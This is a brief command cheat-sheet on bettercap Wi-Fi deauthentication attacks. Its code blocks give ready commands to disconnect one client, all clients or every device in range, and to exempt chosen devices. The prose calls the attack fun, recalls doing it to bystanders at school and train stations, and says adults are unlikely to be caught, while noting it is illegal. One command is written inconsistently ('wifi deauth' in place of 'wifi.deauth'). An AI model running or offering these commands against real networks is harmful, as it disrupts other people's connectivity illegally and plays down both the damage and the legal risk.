---
title: Bettercap - Deauthentication Attack
category: wireless
subcategory: sub-03
os: linux
command: wifi.deauth ff:ff:ff:ff:ff:ff
tools: bettercap
---


## Deauthentication

Deauthentication is simply kicking users off the network. You can have fun with it. I usually did it as a teenager at school or at the train station. If you're an adult, it's unlikely anyone will detect it, but I don't recommend it because it's illegal.

### Using bettercap

```bash
# Deauths all clients:
wifi.deauth BS:ID:BS:ID:BS:ID

# Deauths a specific client:
wifi.deauth CL:IE:NT:CL:IE:NT

# Deauths everything:
wifi.deauth ff:ff:ff:ff:ff:ff
```

### Skipping specific devices

```bash
# Skips a specific router-bssid/client-ssid:
set wifi.deauth.skip CL:IE:NT:CL:IE:NT
wifi deauth BS:ID:BS:ID:BS:ID
```